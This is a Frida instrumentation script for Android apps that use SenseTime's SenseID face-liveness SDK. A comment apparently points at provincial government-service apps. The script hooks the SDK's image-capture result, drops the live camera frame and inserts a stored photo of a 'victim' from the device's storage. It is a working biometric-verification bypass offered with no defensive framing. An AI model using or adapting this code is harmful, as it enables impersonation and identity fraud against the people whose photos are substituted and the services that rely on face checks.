
var pic = "sdcard/Download/victim.jpg"

//gjzwfw、河北、黑龙江
var LivenessLibrary = ["com.sensetime.senseid.sdk.liveness.silent.AbstractSilentLivenessLibrary"
                        ,"com.sensetime.senseid.ccb.sdk.liveness.interactive.AbstractInteractiveLivenessLibrary"
                        ,"com.sensetime.senseid.sdk.liveness.interactive.AbstractInteractiveLivenessLibrary"]

var run = function(){
    Java.perform(function(){
        console.log("attached")

        var File = Java.use('java.io.File')
        var FileInputStream = Java.use('java.io.FileInputStream')
        
        var readBytes = function(path){
            var file = File.$new(path)
            if(!file.exists()){
                console.log("file is missing!")
                return undefined
            }
            var fIn = FileInputStream.$new(file)
            var len = fIn.available()

            var array = new Array(len).fill(0)
            var b = Java.array('byte', array)

            fIn.read(b)
            fIn.close()

            return b
        }

        var Object = Java.use("java.lang.Object")
        
        var AbstractSilentLivenessLibrary = Java.use(LivenessLibrary[0])
        AbstractSilentLivenessLibrary.nativeGetImagesAndFaces.implementation = function(h){
            console.log("nativeGetImagesAndFaces")
            var ret = this.nativeGetImagesAndFaces(h)
            ret.images.value.remove(0)
            var bytes = readBytes(pic)
            ret.images.value.add(Java.cast(bytes,Object))
            return ret
        }


    })

}

setTimeout(run,1000);　